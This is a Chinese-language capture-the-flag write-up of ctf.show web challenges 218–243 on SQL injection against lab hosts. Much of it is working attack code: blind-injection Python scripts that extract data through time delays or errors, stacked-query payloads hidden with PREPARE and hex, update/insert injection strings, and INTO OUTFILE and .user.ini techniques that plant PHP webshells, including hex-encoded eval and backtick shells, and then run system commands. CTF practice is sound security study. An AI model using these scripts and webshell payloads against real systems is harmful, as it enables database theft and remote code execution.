    payload = payload.replace("SLEEP(5)", """(concat(rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a')) RLIKE '(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b')""")
    return payload
```

然后执行命令 但是这里修改tamper的操作量有点高，而且上面这个tamper 不够稳定，很多次我获取不到内容 （可能是没写好），但是确实现在不知道如何修改了

```cobol
py3 .\sqlmap.py -r C:\Users\Administrator\Desktop\1.txt --level 3   -v3 --technique=T --tamper 2  --fresh-queries -p ip  --dbs --prefix ")"
```

即可实现

这里我们开始解释

 [https://www.cnblogs.com/forforever/p/13019703.html](https://www.cnblogs.com/forforever/p/13019703.html) 

```cobol
select rpad('a',4999999,'a') RLIKE concat(repeat('(a.*)+',30),'b')
 
repeat('(a.*)+',30)  将a 复制30次
 
rpad('a',4999999,'a')  将a追加4999999个a 就是 5000000个a
 
concat(repeat('(a.*)+',30),'b') 将 30个a +b 拼接 就是 30*a+b 这种
 
```

所以这里的执行时间 就会很长 然后我们多几次

```lisp
select  concat(rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a')) RLIKE '(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b';
 
 
这里其实就是 很多很多个a  然后 再进行 正则匹配
```

所以这里就会耗时很大 这里是类似于sleep(5) 但是在本地测试 没有那么夸张 也就是0.2s

可能是中间耗时 所以这里我们可以通过这个方式实现注入

下面是脚本 其实脚本很快了 没必要sqlmap 但是可以学会tamper的使用

```cobol
import time
 
import requests
 
 
url = "http://1eee55e7-fb80-48ce-8a22-71f2d1234f2c.challenge.ctf.show/api/"
bypass = """(concat(rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a')) RLIKE '(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b')"""
# payload = "1) or if(ascii(substr((select database()),{0},1))>{1},{2},0)-- +"
# payload = "1) or if(ascii(substr((select group_concat(table_name)from information_schema.tables where table_schema=database()),{0},1))>{1},{2},0)-- +"
# payload = "1) or if(ascii(substr((select group_concat(column_name)from information_schema.columns where table_name='ctfshow_flagxc'),{0},1))>{1},{2},0)-- +"
payload = "1) or if(ascii(substr((select group_concat(id,'---',flagaac)from ctfshow_flagxc),{0},1))>{1},{2},0)-- +"
flag = ''
 
for i in range(1,100):
    high = 128
    low = 32
    mid = (high+low)//2
    while(high>low):
        payload1=payload.format(i,mid,bypass)
        # print(payload1)
        # print(payload1)
        data = {
            'ip':payload1,
            'debug':0
        }
        start_time=time.time()
        re = requests.post(url=url,data=data)
        end_time=time.time()
        subtime=end_time-start_time
        # print(subtime)
        if subtime > 0.9:
            low=mid+1
        else:
            high=mid
        mid=(low+high)//2
        if(chr(mid)==" "):
            break
    flag+=chr(mid)
    print(flag)
 
 
```

所以这里推荐使用脚本 速度会比tamper快多了

## web219  过滤 rlike  笛卡尔积

```php
    //屏蔽危险分子
    function waf($str){
        return preg_match('/sleep|benchmark|rlike/i',$str);
    }   
```

这里可以发现 rlike也被过滤了 但是其实上面的payload 不需要rlike 使用 like也可以

所以我们修改一下

```cobol
import time
 
import requests
 
 
url = "http://1eee55e7-fb80-48ce-8a22-71f2d1234f2c.challenge.ctf.show/api/"
bypass = """(concat(rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a')) RLIKE '(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b')"""
# payload = "1) or if(ascii(substr((select database()),{0},1))>{1},{2},0)-- +"
# payload = "1) or if(ascii(substr((select group_concat(table_name)from information_schema.tables where table_schema=database()),{0},1))>{1},{2},0)-- +"
# payload = "1) or if(ascii(substr((select group_concat(column_name)from information_schema.columns where table_name='ctfshow_flagxc'),{0},1))>{1},{2},0)-- +"
payload = "1) or if(ascii(substr((select group_concat(id,'---',flagaac)from ctfshow_flagxc),{0},1))>{1},{2},0)-- +"
flag = ''
 
for i in range(1,100):
    high = 128
    low = 32
    mid = (high+low)//2
    while(high>low):
        payload1=payload.format(i,mid,bypass)
        # print(payload1)
        # print(payload1)
        data = {
            'ip':payload1,
            'debug':0
        }
        start_time=time.time()
        re = requests.post(url=url,data=data)
        end_time=time.time()
        subtime=end_time-start_time
        # print(subtime)
        if subtime > 0.9:
            low=mid+1
        else:
            high=mid
        mid=(low+high)//2
        if(chr(mid)==" "):
            break
    flag+=chr(mid)
    print(flag)
 
 
```

但是这里进行调试的时候发现失败了 所以使用另一个方法吧

使用笛卡尔积

```css
(SELECT count(*) FROM information_schema.tables A, information_schema.schemata B, information_schema.schemata D, information_schema.schemata E, information_schema.schemata F,information_schema.schemata G, information_schema.schemata H,information_schema.schemata I)
```

这里的内容替换到 sleep的地方 这样他计算count的时候 就会话很多时间去计算所有联合的表 实现时间注入

这里理解一下笛卡尔积 就知道为什么了

所以修改脚本

```cobol
import time
 
import requests
 
 
url = "http://35a48f84-e167-4e17-8291-ce63ea766ba3.challenge.ctf.show/api/"
bypass = """(SELECT count(*) FROM information_schema.tables A, information_schema.schemata B, information_schema.schemata D, information_schema.schemata E, information_schema.schemata F,information_schema.schemata G, information_schema.schemata H,information_schema.schemata I)"""
# payload = "1) or if(ascii(substr((select database()),{0},1))>{1},{2},0)-- +"
# payload = "1) or if(ascii(substr((select group_concat(table_name)from information_schema.tables where table_schema=database()),{0},1))>{1},{2},0)-- +"
# payload = "1) or if(ascii(substr((select group_concat(column_name)from information_schema.columns where table_name='ctfshow_flagxca'),{0},1))>{1},{2},0)-- +"
payload = "1) or if(ascii(substr((select group_concat(id,'---',flagaabc)from ctfshow_flagxca),{0},1))>{1},{2},0)-- +"
flag = ''
 
for i in range(1,100):
    high = 128
    low = 32
    mid = (high+low)//2
    while(high>low):
        payload1=payload.format(i,mid,bypass)
        # print(payload1)
        # print(payload1)
        data = {
            'ip':payload1,
            'debug':0
        }
        start_time=time.time()
        re = requests.post(url=url,data=data)
        end_time=time.time()
        subtime=end_time-start_time
        # print(subtime)
        if subtime > 0.85:
            low=mid+1
        else:
            high=mid
        mid=(low+high)//2
        if(chr(mid)==" "):
            break
    flag+=chr(mid)
    print(flag)
 
 
```

## web220  过滤ascii substr mid concat

```php
    //屏蔽危险分子
    function waf($str){
        return preg_match('/sleep|benchmark|rlike|ascii|hex|concat_ws|concat|mid|substr/i',$str);
    }   
```

这里发现过滤了很多东西

我们使用left 绕过这些过滤

这里看yu师傅的另一个写法

```cobol
import string
 
import requests
 
url ="http://7f721d88-a3c0-4870-b78d-b062df2f81b0.challenge.ctf.show/api/"
 
# payload = "1) or if((left((select database()),{0})='{1}'),{2},0)-- +"
# payload = "1) or if((left((select table_name from information_schema.tables where table_schema=database() limit 0,1),{0})='{1}'),{2},0)-- +"
# payload = "1) or if((left((select column_name from information_schema.columns where table_name='ctfshow_flagxcac' limit 1,1),{0})='{1}'),{2},0)-- +"
payload = "1) or if((left((select flagaabcc from ctfshow_flagxcac limit 0,1),{0})='{1}'),{2},0)-- +"
bypass = """(SELECT count(*) FROM information_schema.tables A, information_schema.schemata B, information_schema.schemata D, information_schema.schemata E, information_schema.schemata F,information_schema.schemata G, information_schema.schemata H,information_schema.schemata I)"""
uuid = "_1234567890{}-qazwsxedcrfvtgbyhnujmikolp,"
flag =''
i = 1
while 1:
    for j in uuid:
        flag +=j
        payload1= payload.format(i,flag,bypass)
        # print(payload1)
        data = {
            'ip':payload1,
            'debug':'1'
        }
        try:
            r = requests.post(url, data=data, timeout=3)
            flag = flag[:-1]
        except Exception as e:
            print(flag)
            i+= 1
```

其实就是很少的循环 代码量少了 并且通过捕获异常 输出flag 所以这个代码 更舒服点

这个写法 不需要time的计算 确实让人眼前一亮

## web221  limit 后进行注入获取数据库

这里提示我们 需要在limit后面注入

然后我们获取到数据即可

然后我们可以使用报错注入

这里 [MySQL利用procedure analyse()函数优化表结构_Mysql_脚本之家](https://www.jb51.net/article/99980.htm) 

看了wp实现的 说limit后面 只能跟这个了 所以可以记住

这里我们来看看

这里其实就是 一个内容 通过procedure analyse 可以获取到数据库名

所以这里直接payload

```cobol
http://40ad8581-ee3a-4348-bc01-e3fe4257dfcf.challenge.ctf.show/api/?page=1&limit=10%20procedure%20analyse(extractvalue(rand(),concat(0x7e,database())),2)
```

但是好像只能到这里了 获取到数据库就没有了

## web222 group by 后的 布尔，时间注入  concat 实现注入

```cobol
$sql = select * from ctfshow_user group by $username;
```

能发现我们注入的内容是在group by 后

这里就需要通过group by 注入

 [https://www.cnblogs.com/02SWD/p/CTF-sql-group_by.html](https://www.cnblogs.com/02SWD/p/CTF-sql-group_by.html)   
之前sqlilab的时候学过

但是其实这里不是group by 注入 这里其实就是布尔和时间注入

因为group by 后可以通过字符串和字段 所以我们可以通过concat 来实现注入

这里有两个 payload

```cobol
concat(sleep(0.10),1)
 
和 
 
concat(if(1=1,"username",cot(0)))
```

然后写个脚本即可

这里使用 cot(0)  因为 这里concat 后 无法通过if 传递 0 就是 无法设置if(判断,1,0)

所以这里通过一个报错 让页面无回显，实现布尔注入

随便选个写就可以了

```cobol
import string
 
import requests
 
url = "http://8b4bc884-0021-4695-bc9b-2885fab08d7d.challenge.ctf.show/api/?u="
 
# payload ="concat((if(ascii(substr((select database()),{0},1))>{1}, sleep(0.05), 2)), 1);"
# payload ="concat((if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{0},1))>{1}, sleep(0.05), 2)), 1);"
# payload ="concat((if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flaga'),{0},1))>{1}, sleep(0.05), 2)), 1);"
payload ="concat((if(ascii(substr((select group_concat(id,'---',flagaabc) from ctfshow_flaga),{0},1))>{1}, sleep(0.05), 2)), 1);"
flag = ""
 
 
for i in range(1,100):
    high = 128
    low = 32
    mid = (high+low)//2
    while (high>low):
        pay1 = payload.format(i,mid)
        # print(pay1)
        nurl = url+pay1
        # print(nurl)
        try:
            re = requests.get(nurl,timeout=1)
            high=mid
        except Exception as e:
            low = mid + 1
        mid = (low+high)//2
        if chr(mid)==" ":
            exit()
    flag +=chr(mid)
    print(flag)
```

实现注入了

## web223  过滤数字

过滤了数字 通过web185的方法即可绕过

我们的payload 依然是

```lisp
concat((if(ascii(substr((select database()),{0},1))>{1}, username, cot(0)))
```

这里需要通过requests的 params参数传递

这个参数会自动在url后面接上?u=参数

这里需要再次强调， group by 后面只能加 字段名 或者字符串 就是 username 或者 'a' 这种形式

```cobol
import string
 
import requests
 
url = 'http://0ca46a1b-2f7b-4973-b643-661fd455831f.challenge.ctf.show/api/?u='
 
 
# payload = "select database()"
# payload = "select group_concat(table_name)from information_schema.tables where table_schema=database()"
# payload = "select group_concat(column_name)from information_schema.columns where table_name='ctfshow_flagas'"
payload = "select group_concat(flagasabc)from ctfshow_flagas"
flag =''
 
def createNum(n):
    num = 'true'
    if n == 1:
        return 'true'
    else:
        for i in range(n-1):
            num+="+true"
        return num
 
def createStrNum(c):
    str=''
    str += 'chr('+createNum(ord(c[0]))+')'
    for i in c[1:]:
        str +=',chr(' + createNum(ord(i)) + ')'
    return str
 
uuid = string.ascii_lowercase+string.digits+"_-,}{"
 
for i in range(1,50):
    for j in range(32,128):
        payload1 = f"if(ascii(substr(({payload}),{createNum(i)},true))>{createNum(j)},username,'a')"
        # print(payload1)
        params={
            'u':payload1
        }
        re = requests.get(url=url,params=params)
        # print(re.text)
        if r'{"id":"2","username":"user1","pass":"111"}' not in re.text:
            flag += chr(j)
            print(flag)
            # if j == '}':
            #     exit()
            break
```

## ⭐⭐web224 文件上传注入

这个有意思 文件上传注入

原型是 [你没见过的注入](https://www.cnblogs.com/N0ri/p/14228343.html) 

原理其实是 上传文件后，后端通过读取文件信息 存入数据库 造成的堆叠注入

所以这里我们首先需要猜测内容

我们来做一下

拿到题目 目录扫描



<img src="https://i-blog.csdnimg.cn/blog_migrate/80f4d1b1118ef4d2b97ea825d362366e.png" alt="" style="max-height:176px; box-sizing:content-box;" />


发现君子协议 然后会获取到重置密码的界面

```cobol
User-agent: *
Disallow: /pwdreset.php
```

重置完直接登入



<img src="https://i-blog.csdnimg.cn/blog_migrate/7c584ec6f0fb8e24d560b10a70dd36bb.png" alt="" style="max-height:145px; box-sizing:content-box;" />


发现是文件上传 但是不能上传图片和php 只能zip

我们首先尝试上传一下



<img src="https://i-blog.csdnimg.cn/blog_migrate/92ae88c0c3c9ac90b69df317df7cb4f3.png" alt="" style="max-height:126px; box-sizing:content-box;" />


上传成功了 这里只能下载文件 并且后面是文件的信息

所以这里是无法实现注入 的

但是我们应该思考 这里为什么可以获取到文件信息

一定是存到数据库 然后读取前端回显



这里有点不知道为什么

我们首先拿别的师傅payload getshell一下

然后下载代码看看

```cobol
C64File "');select 0x3c3f3d60245f504f53545b315d603f3e into outfile '/var/www/html/3.php';--+
```

```php
<?php
	error_reporting(0);
	if ($_FILES["file"]["error"] > 0)
	{
		die("Return Code: " . $_FILES["file"]["error"] . "<br />");
	}
	if($_FILES["file"]["size"]>10*1024){
		die("文件过大: " .($_FILES["file"]["size"] / 1024) . " Kb<br />");
	}
 
    if (file_exists("upload/" . $_FILES["file"]["name"]))
      {
      echo $_FILES["file"]["name"] . " already exists. ";
      }
    else
      {
	  $filename = md5(md5(rand(1,10000))).".zip";
      $filetype = (new finfo)->file($_FILES['file']['tmp_name']);
      if(preg_match("/image|png|bmap|jpg|jpeg|application|text|audio|video/i",$filetype)){
        die("file type error");
      }
	  $filepath = "upload/".$filename;
	  $sql = "INSERT INTO file(filename,filepath,filetype) VALUES ('".$filename."','".$filepath."','".$filetype."');";
      move_uploaded_file($_FILES["file"]["tmp_name"],
      "upload/" . $filename);
	  $con = mysqli_connect("localhost","root","root","ctf");
		if (!$con)
		{
			die('Could not connect: ' . mysqli_error());
		}
		if (mysqli_multi_query($con, $sql)) {
			header("location:filelist.php");
		} else {
			echo "Error: " . $sql . "<br>" . mysqli_error($con);
		}
		 
		mysqli_close($con);
		
      }
    
?>
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/8f052a8f577f7e1aeb01afce2a954773.png" alt="" style="max-height:514px; box-sizing:content-box;" />


发现存在两个过滤



<img src="https://i-blog.csdnimg.cn/blog_migrate/9c786ae18400fa80f68762bfbd8b88d9.png" alt="" style="max-height:149px; box-sizing:content-box;" />


这里是我们注入的地方

这里其实是文件头检测

我们使用上面那个payload的时候其实是模拟 一个64pc文件

我们可以通过file命令查看



<img src="https://i-blog.csdnimg.cn/blog_migrate/57900506a6063576478b54b3d7e1d65b.png" alt="" style="max-height:133px; box-sizing:content-box;" />


当然 我们也可以修改为GIF89a (这道题不行)



<img src="https://i-blog.csdnimg.cn/blog_migrate/57c1a9bf932d5c8ce9934ce49988c413.png" alt="" style="max-height:84px; box-sizing:content-box;" />




<img src="https://i-blog.csdnimg.cn/blog_migrate/8c54e309c18fc80b7a8a33aeb99ac9c5.png" alt="" style="max-height:93px; box-sizing:content-box;" />


所以我们可以通过上面的insert进行注入

本质是堆叠注入

然后我们就getshell了

```cobol
http://d26758e3-667a-4886-a97a-f6f0289f4c2d.challenge.ctf.show/1222.php?1=ls
```

这道题看上去是没有思路 但是思考一下为什么文件信息能够回显 其实差不多就了然了

主要是这里使用其他文件的文件头

这里也可以使用其他的 zip什么的文件头都可以

```undefined
PK "');select 0x3c3f3d60245f4745545b315d603f3e into outfile '/var/www/html/1222.php';--+
```

## ⭐web225

提示我们堆叠开始提升 我们看看内容

查看过滤

```php
  //师傅说过滤的越多越好
  if(preg_match('/file|into|dump|union|select|update|delete|alter|drop|create|describe|set/i',$username)){
    die(json_encode($ret));
  }
```

不让写入 不能增删改查

```php
$sql = "select id,username,pass from ctfshow_user where username = '{$username}';";
```

语句是在where中

我们开始测试

首先这里是堆叠注入 所以我们可以操作的地方更大了 我们可以通过预处理来操作

### 预处理 handler注入和预处理注入

就类似于定义一样

```sql
PRERARE abcd from [sql语句]  预处理（定义）
 
execute abcd 执行
 
(DEALLOCATE || DROP) PRERARE abcd
```

这样我们就可以执行命令了



<img src="https://i-blog.csdnimg.cn/blog_migrate/b5ab60f6cdfb9ff8ab63ca08c03b96fc.png" alt="" style="max-height:377px; box-sizing:content-box;" />


```csharp
char(115,101,108,101,99,116) 是select
```

其实这里也不需要使用这个 毕竟是字符串联合在一起所以并不需要

```sql
select * from user where id=1;PREPARE abcd from concat('sele','ct database()');execute abcd;
```

这样也可实现，那么这道题就可以做完了

```csharp
1';PREPARE abcd from concat("selec","t database()");execute abcd;#
 
1';PREPARE abcd from concat("show"," tables");execute abcd;#
 
1';PREPARE abcd from concat("sele","ct * from  ctfshow_flagasa");execute abcd;#
```

### handler代替select读取

这里还可以使用handler来代替使用 但是这个适用面会小很多



<img src="https://i-blog.csdnimg.cn/blog_migrate/ca9e18e4300e8078cb31291181073e50.png" alt="" style="max-height:299px; box-sizing:content-box;" />


这里其实比较吃力 就是我们首先打开表 使用open 然后我们一行一行读取表的内容 这就是handler

我们如果需要读取下一个 就将first替换为next即可

所以这里的payload

```perl
1';show databases;show tables;#

1';handler `ctfshow_flagasa` open;handler `ctfshow_flagasa` read first;#
```

实现注入

## web226  过滤数字

```lisp
  if(preg_match('/file|into|dump|union|select|update|delete|alter|drop|create|describe|set|show|\(/i',$username)){
    die(json_encode($ret));
  }
```

增加了过滤

这里直接通过十六进制传递即可

```cobol
1';PREPARE abcd from 0x53454C45435420534348454D415F4E414D452046524F4D20494E464F524D4154494F4E5F534348454D412E534348454D415441;execute abcd;#

通过information 查看数据库

1';PREPARE abcd from 0x73686f772020646174616261736573;execute abcd;#
 
show databases;
 
1';PREPARE abcd from 0x73686F77207461626C6573;execute abcd;#

show tables;


1';PREPARE abcd from 0x73656C656374202A2066726F6D2063746673685F6F775F666C61676173;execute 
abcd;#
 
select * from ctfsh_ow_flagas
```

## web227  存储过程

```php
  //师傅说过滤的越多越好
  if(preg_match('/file|into|dump|union|select|update|delete|alter|drop|create|describe|set|show|db|\,/i',$username)){
    die(json_encode($ret));
  }
```

一样打

```cobol
1';PREPARE abcd from 0x53454C45435420534348454D415F4E414D452046524F4D20494E464F524D4154494F4E5F534348454D412E534348454D415441;execute abcd;#

通过information 查看数据库

1';PREPARE abcd from 0x73686f772020646174616261736573;execute abcd;#
 
show databases;
 
1';PREPARE abcd from 0x73686F77207461626C6573;execute abcd;#

show tables;


1';PREPARE abcd from 0x73656C656374202A2066726F6D2063746673686F775F75736572;execute abcd;#
 
select * from ctfshow_user
 
 
 
```

但是发现没有flag 这里考的是存储过程

就类似于php python 的 def 是自己写的函数

所以我们如果要看 我们就需要通过information_schema.routines表查看

```csharp
1';PREPARE abcd from 0x73656C656374202A2066726F6D20696E666F726D6174696F6E5F736368656D612E726F7574696E6573;execute abcd;#
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/db594714f097abe691aa02c6d8cd2c30.png" alt="" style="max-height:282px; box-sizing:content-box;" />


能发现getflag

并且下面已经给出了flag

如果我们需要调用

```csharp
1';call getFlag();#
```

## web228

继续看看过滤

```php
  //师傅说内容太多，就写入数据库保存
  if(count($banlist)>0){
    foreach ($banlist as $char) {
      if(preg_match("/".$char."/i", $username)){
        die(json_encode($ret));
      }
    }
  }
```

这里不让我们看了 不知道被过滤了什么 用上面的继续看看

和上面一样 只是 表名字不一样而已

```csharp
1';PREPARE abcd from 0x73656C656374202A2066726F6D2063746673685F6F775F666C616761736161;execute abcd;#
```

## web229

```csharp
1';PREPARE abcd from 0x73656C656374202A2066726F6D20666C6167;execute abcd;#
```

## web230

```csharp
1';PREPARE abcd from 0x73656C656374202A2066726F6D20666C61676161626278;execute abcd;#
```

## web231 update注入

这里提示update注入

```php
 
  $sql = "update ctfshow_user set pass = '{$password}' where username = '{$username}';";
```

多半是二次注入

并且无过滤  但是测试下来 不需要 因为无过滤 二次注入也太麻烦了

我们直接覆盖变量即可

```cobol
查看语句 这里主要是通过 username 来更新password
 
 
password=1&username=ctfshow
 
能发现ctfshow的密码被修改了 
 
那么这里我们如何实现呢
 
我们注意语句
 
$sql = "update ctfshow_user set pass = '{$password}' where username = '{$username}';";
 
pass可控 我们闭合即可
 
password =1'

update ctfshow_user set pass = '1',username =database()-- +'
 
这样 我们是不是就传递了 将username修改为数据库的命令
 
所以payload为
 
password=0',username=database()%23&username=1
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/adbfccc1264019169107d520e8f87f51.png" alt="" style="max-height:246px; box-sizing:content-box;" />


发现修改成功了 然后我们就只需要修改payload即可

```cobol
password=0',username=database()%23&username=1


password=0',username=(select group_concat(table_name)from information_schema.tables where table_schema=database())%23&username=1
 
 
password=1',username=(select group_concat(column_name)from information_schema.columns where table_name='flaga')%23&username=1


password=1',username=(select group_concat(flagas)from flaga)%23&username=1
```

即可获取

## web232

上一题一样的

## web233 错误

使用上面的payload 发现无法实现了

那么看看其他方法

```php
$sql = "update ctfshow_user set pass = '{$password}' where username = '{$username}';";
```

这里其实就很简单了 就在username中盲注即可

我们首先来测试

```cobol
password=0&username=' or if((1=1),sleep(5),1)-- +
```

实现注入 写脚本即可

但是经过测试 发现 无法实现 不知道为什么 一开始时间注入 就卡 网络就炸

以后再来吧

## web234 过滤引号

这里发现过滤了 ’ 所以我们只能通过 转义符\进行闭合

这里闭合是这样

```cobol
 
  $sql = "update ctfshow_user set pass = '\' where username = ',username=database()#";
 
payload = 
 
password=\&username=,username=database()#
```

仔细看看这个语句 就可以知道了

然后我们就可以开始注入了

```cobol
password=\&username=,username=database()#
 
 
password=\&username=,username=(select+group_concat(table_name)+from+information_schema.tables+where+table_schema=database())-- +
 
 
password=\&username=,username=(select+group_concat(column_name)+from+information_schema.columns+where+table_name=0x666C6167323361)-- +
 
password=\&username=,username=(select+group_concat(flagass23s3)from+flag23a)-- +
```

## web235 无列名注入 查询

or被过滤 information也没了

使用其他可以查到 表名

```cobol
password=\&username=,username=(select group_concat(table_name) from mysql.innodb_table_stats where database_name=database())-- +
```

这里我们无法获取列名 只能请出经典的无列名注入

下面是本地测试



<img src="https://i-blog.csdnimg.cn/blog_migrate/4e00764bfa01323536c722b40bbed732.png" alt="" style="max-height:530px; box-sizing:content-box;" />


然后我们查询b即可



<img src="https://i-blog.csdnimg.cn/blog_migrate/7da2a9ba30d6c268299cd6a5df9d88e9.png" alt="" style="max-height:505px; box-sizing:content-box;" />


所以这里我们也使用这个方法即可



```cobol
password=\&username=,username=(select b from (select 1,2 as b,3 union select * from flag23a1 limit 1,1)a)-- +
```

## web236  修改输出方式

```cobol
  //过滤 or ' flag
```

开始

```cobol
password=\&username=,username=(select b from (select 1,2 as b,3 union select * from flaga limit 1,1)a)-- +
```

说过滤了flag 其实过滤的是输出为flag的值？？？

其实这里应该是想让我们通过 to_base64()输出吧

## web237  inset注入

```php
 //插入数据
  $sql = "insert into ctfshow_user(username,pass) value('{$username}','{$password}');";
```

这里直接闭合即可注入

```cobol
 
 
insert into ctfshow_user(username,pass) value('1',(select database()))-- +','{$password}');";



所以payload 为 1',(select database()))-- +
 
username=1',(select group_concat(table_name)from information_schema.tables where table_schema=database()))-- +&password=1


username=1',(select group_concat(column_name)from information_schema.columns where table_name='flag'))-- +&password=1
 
 
username=1',(select group_concat(flagass23s3)from flag))-- +&password=1
```

## web238 过滤空格

提示我们过滤了空格

```cobol
username=1',(select(database())))#&password=1

username=1',(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())))#&password=1
 
username=1',(select(group_concat(flag))from(flagb)))#&password=1
```

## web239  过滤 or

```cobol
  //过滤空格 or 
```

过滤了 information 我们使用其他的库查看

```cobol
mysql.innodb_table_stats
```

```cobol
username=1',(select(database())))#&password=1


username=1',(select(group_concat(table_name))from(mysql.innodb_table_stats)where(database_name=database())))#&password=1
 
然后我们不知道列名怎么办
 
并且这个不会返回报错信息 所以只能要么爆破 要么猜 是flag
 
username=1',(select(group_concat(flag))from(flagbb)))#&password=1

```

## web240  爆破字段名

这道题啥都给过滤了

我们无法获取到值

只能爆破了

```cobol
Hint: 表名共9位，flag开头，后五位由a/b组成，如flagabaab，全小写
```

这里给出了一个规则

这里直接编写脚本跑吧

```cobol
import requests
 
url ="http://6c5d53d2-c147-4039-9104-39590e2e7198.challenge.ctf.show/api/insert.php"
i =0
for v1 in 'ab':
    for v2 in 'ab':
        for v3 in 'ab':
            for v4 in 'ab':
                for v5 in 'ab':
                    tables = "flag"+v1+v2+v3+v4+v5
                    payload = f"1',(select(group_concat(flag))from({tables})))#"
                    data = {
                        'username':payload,
                        'password': '1'
                    }
                    r=requests.post(url=url,data=data)
                    i +=1
print("爆破了"+str(i)+"次")
```

然后 去看看倒序 就出来了



<img src="https://i-blog.csdnimg.cn/blog_migrate/33bacd059d0a90723f296d2c11d3dcc8.png" alt="" style="max-height:244px; box-sizing:content-box;" />


## web241 delete 无过滤

```php
  $sql = "delete from  ctfshow_user where id = {$id}";
```

这里需要使用盲注 因为delete 不会回显

使用时间盲注

```cobol
import requests
 
url = 'http://41c233cb-0e85-495e-9d5f-e240576c9a4c.challenge.ctf.show/api/delete.php'
 
# payload = "select database()"
# payload = """select group_concat(table_name) from information_schema.tables where table_schema=database()"""
# payload = """select group_concat(column_name) from information_schema.columns where table_name='flag'"""
payload = """select group_concat(flag) from flag"""
flag =''
for i in range(1,100):
    high = 128
    low = 32
    mid = (high+low)//2
    while(high>low):
        payload1= f"if((ascii(substr(({payload}),{i},1)))>{mid},3,sleep(0.05))-- +"
        # print(payload1)
        data = {
            'id':payload1
        }
        try:
            re = requests.post(url=url,data=data,timeout=0.9)
            low = mid +1
        except Exception as e:
            high = mid
        mid =  (high+low)//2
    if low !=32:
        flag +=chr(mid)
        print(flag)
 
```

新的写法 终于有点熟练了

## web242  file无过滤 在into outfile 后进行写木马

```php
  $sql = "select * from ctfshow_user into outfile '/var/www/html/dump/{$filename}';";
```

这里发现是写入文件 并且文件名是我们指定的

```cobol
“OPTION”参数为可选参数选项，其可能的取值有：
 
`FIELDS TERMINATED BY '字符串'`：设置字符串为字段之间的分隔符，可以为单个或多个字符。默认值是“\t”。
 
`FIELDS ENCLOSED BY '字符'`：设置字符来括住字段的值，只能为单个字符。默认情况下不使用任何符号。
 
`FIELDS OPTIONALLY ENCLOSED BY '字符'`：设置字符来括住CHAR、VARCHAR和TEXT等字符型字段。默认情况下不使用任何符号。
 
`FIELDS ESCAPED BY '字符'`：设置转义字符，只能为单个字符。默认值为“\”。
 
`LINES STARTING BY '字符串'`：设置每行数据开头的字符，可以为单个或多个字符。默认情况下不使用任何字符。
 
`LINES TERMINATED BY '字符串'`：设置每行数据结尾的字符，可以为单个或多个字符。默认值是“\n”。
```

可以发现 有3 个可以实现注入

```cobol
FIELDS TERMINATED BY
 
LINES STARTING BY 
 
LINES TERMINATED BY
```

随便选取一个即可



这里在本地进行演示



<img src="https://i-blog.csdnimg.cn/blog_migrate/ecdb388d6b96c485f96b24b8b9970907.png" alt="" style="max-height:487px; box-sizing:content-box;" />




<img src="https://i-blog.csdnimg.cn/blog_migrate/54ac07593c026276204686bc9eab3826.png" alt="" style="max-height:499px; box-sizing:content-box;" />


<img src="https://i-blog.csdnimg.cn/blog_migrate/dc6317634ef330c943d37ed188adbcb8.png" alt="" style="max-height:615px; box-sizing:content-box;" />


所以这里随便选一个就可以进行写马操作

在/api/dump.php 处 post

```php
filename=3.php' LINES STARTING BY '<?php eval($_POST[0]);?>'#

```

然后去到 /dump/3.php处 执行命令即可

```cobol
0=system('cat /flag.here');
```

## ⭐⭐web243  写入 .user.ini 和图片马

这里我们首先查看服务器



<img src="https://i-blog.csdnimg.cn/blog_migrate/a6dcf4b878d3d150516aa9783e65becd.png" alt="" style="max-height:302px; box-sizing:content-box;" />


发现是nginx可以解析 .user.ini 所以我们首先写入传递 .user.ini

```cpp
filename=.user.ini' LINES STARTING BY ";" TERMINATED BY 0x0a6175746f5f70726570656e645F66696c653d656173792e706e670a#
 
 
这里我们需要注意 写入一个 ; 是为了将数据库查询出来的内容注释掉 
 
意思就是在开头写入 ; 然后再结尾 写入
0x0a6175746f5f70726570656e645F66696c653d656173792e706e670a#
```

这个十六进制 是写入

```cobol
 
auto_prepend_file=easy.png
 
```

注意这里的格式 前面有一个回车 后面有一个回车 上面十六机制 0A 能体现

现在我们写入图片马

```vbnet
filename=easy.png' LINES TERMINATED BY 0x3c3f706870206576616c28245f504f53545b305d293b3f3e#
```

